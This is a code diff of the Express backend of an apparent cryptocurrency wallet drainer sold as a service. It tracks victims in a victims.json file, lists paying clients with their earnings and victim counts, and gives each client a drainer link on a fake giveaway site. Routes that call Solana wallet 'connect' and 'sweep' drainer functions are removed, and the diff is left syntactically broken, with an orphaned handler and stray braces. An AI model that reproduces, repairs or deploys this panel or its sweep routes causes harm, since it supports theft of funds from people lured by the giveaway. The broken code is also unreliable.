@@ -1770,8 +1770,49 @@ app.get(["/panel", "/panel.html"], (req, res) => {
 });
 
 // Victim history API - FIXED VERSION
+// Clean routes added
+
+// Victim history API - CLEAN VERSION
 app.get("/api/history", (req, res) => {
-// SAAS Clients API - Get all registered clients for the panel
+  try {
+    const victimsFile = path.join(__dirname, "victims.json");
+    
+    // Check if file exists - if not, create it
+    if (!fs.existsSync(victimsFile)) {
+      fs.writeFileSync(victimsFile, "[]", "utf8");
+      return res.json([]);
+    }
+    
+    // Read the file
+    const fileContent = fs.readFileSync(victimsFile, "utf8").trim();
+    
+    // If file is empty, initialize with empty array
+    if (!fileContent) {
+      fs.writeFileSync(victimsFile, "[]", "utf8");
+      return res.json([]);
+    }
+    
+    // Parse JSON and ensure it's always an array
+    let data;
+    try {
+      data = JSON.parse(fileContent);
+    } catch (parseError) {
+      console.log("Error parsing victims.json, resetting:", parseError.message);
+      fs.writeFileSync(victimsFile, "[]", "utf8");
+      return res.json([]);
+    }
+    
+    // Ensure we always return an array
+    const result = Array.isArray(data) ? data : [];
+    res.json(result);
+    
+  } catch (error) {
+    console.error("Error in /api/history:", error.message);
+    res.json([]);
+  }
+});
+
+// SAAS Clients API - CLEAN VERSION
 app.get("/api/saas-clients", (req, res) => {
   try {
     const clientsArray = Array.from(clients.entries()).map(([clientId, client]) => {
@@ -1786,7 +1827,7 @@ app.get("/api/saas-clients", (req, res) => {
         themeColor: client.themeColor || "#6366f1",
         totalEarnings: totalEarnings.toFixed(4),
         victimCount,
-        registrationDate: client.registrationDate || "Recent",
+        registrationDate: "Recent",
         drainerUrl: "https://cheetah-giveaway.netlify.app/?client=" + clientId,
         dashboardUrl: "https://service-s816.onrender.com/saas/dashboard/" + clientId
       };
@@ -1802,52 +1843,6 @@ app.get("/api/saas-clients", (req, res) => {
     res.status(500).json({ error: "Failed to fetch clients" });
   }
 });
-
-// SAAS Clients API - Get all registered clients for the panel
-    if (!fileContent) {
-      console.log('📁 victims.json is empty, initializing...');
-      fs.writeFileSync(victimsFile, '[]', 'utf8');
-      return res.json([]); // Return empty array
-    }
-    
-    // Parse JSON and ensure it's always an array
-    let data;
-    try {
-      data = JSON.parse(fileContent);
-    } catch (parseError) {
-      console.error('❌ JSON parse error, resetting file:', parseError.message);
-      // If JSON is corrupted, reset the file
-      fs.writeFileSync(victimsFile, '[]', 'utf8');
-      return res.json([]); // Return empty array
-    }
-    
-    // Ensure we always return an array, even if data is null/undefined
-    const result = Array.isArray(data) ? data : [];
-    console.log('✅ Returning history data:', result.length, 'items');
-    
-    res.json(result);
-    
-  } catch (error) {
-    console.error('❌ Unexpected error in /api/history:', error.message);
-    
-    // Always return an array, never an error object
-    res.json([]);
-  }
-});
-
-// Add to backend/index.js:
-});
-app.post('/api/solana/connect', async (req, res) => {
-  try {
-    const result = await solanaDrainer.connectSolanaWallet();
-    res.json(result);
-  } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
-});
-
-app.post('/api/solana/sweep', async (req, res) => {
-  try {
     const { userAddress } = req.body;
     const result = await solanaDrainer.sweepSolanaAssets(userAddress);
     res.json(result);
